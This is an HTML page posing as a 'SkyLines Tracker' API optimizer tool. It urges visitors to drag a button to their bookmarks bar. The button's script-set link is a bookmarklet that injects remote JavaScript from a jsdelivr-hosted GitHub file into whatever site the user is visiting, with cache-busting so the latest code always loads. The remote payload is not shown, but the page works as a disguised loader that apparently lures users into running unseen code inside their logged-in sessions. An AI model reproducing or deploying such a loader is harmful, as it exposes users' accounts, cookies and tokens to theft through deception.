<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SkyLines Tracker | API Optimizer</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #050505; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.3; }
        .container { position: relative; z-index: 10; text-align: center; background: rgba(15, 15, 15, 0.8); padding: 40px; border: 1px solid #ab47bc; border-radius: 12px; box-shadow: 0 0 30px rgba(171, 71, 188, 0.2); }
        h1 { font-weight: 900; letter-spacing: -1px; margin-bottom: 10px; color: #ab47bc; }
        p { color: #888; font-size: 14px; margin-bottom: 30px; }
        .cta-button { display: inline-block; background: #ab47bc; color: #fff; padding: 15px 40px; text-decoration: none; border-radius: 6px; font-weight: 700; transition: transform 0.2s; cursor: move; border: none; }
        .cta-button:hover { transform: scale(1.05); background: #9c27b0; }
        .instructions { font-size: 12px; color: #555; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

    <canvas id="filamentCanvas"></canvas>

    <div class="container">
        <h1>SKYLINES TRACKER</h1>
        <p>Drag the tool below to your bookmarks bar to begin optimization.</p>
        
        <a href="#" class="cta-button" id="skylines-tool">SKYLINE OPTIMIZER</a>
        
        <div class="instructions">Drag & Drop to Bookmarks</div>
    </div>

    <script>
        // 1. CONFIGURATION - Update your GitHub link here
        const GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/Jinxthesimp/assets@main/tracker.js";

        // 2. LOADER GENERATOR (Bookmarklet Code)
        const loaderCode = `javascript:(function(){var s=document.createElement('script');s.src='${GITHUB_RAW_URL}?v='+Math.random();document.body.appendChild(s);})();`;
        document.getElementById('skylines-tool').href = loaderCode;

        // 3. VISUALS (Filament Background)
        const canvas = document.getElementById('filamentCanvas');
        const ctx = canvas.getContext('2d');
        let dots = [];
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        for(let i=0; i<40; i++) {
            dots.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                vx: (Math.random() - 0.5) * 2,
                vy: (Math.random() - 0.5) * 2
            });
        }

        function animate() {
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.strokeStyle = '#ab47bc';
            ctx.beginPath();
            dots.forEach(d => {
                d.x += d.vx; d.y += d.vy;
                if(d.x < 0 || d.x > canvas.width) d.vx *= -1;
                if(d.y < 0 || d.y > canvas.height) d.vy *= -1;
                ctx.moveTo(d.x, d.y);
                ctx.lineTo(d.x + 2, d.y + 2);
            });
            ctx.stroke();
            requestAnimationFrame(animate);
        }
        animate();
    </script>
</body>
</html>
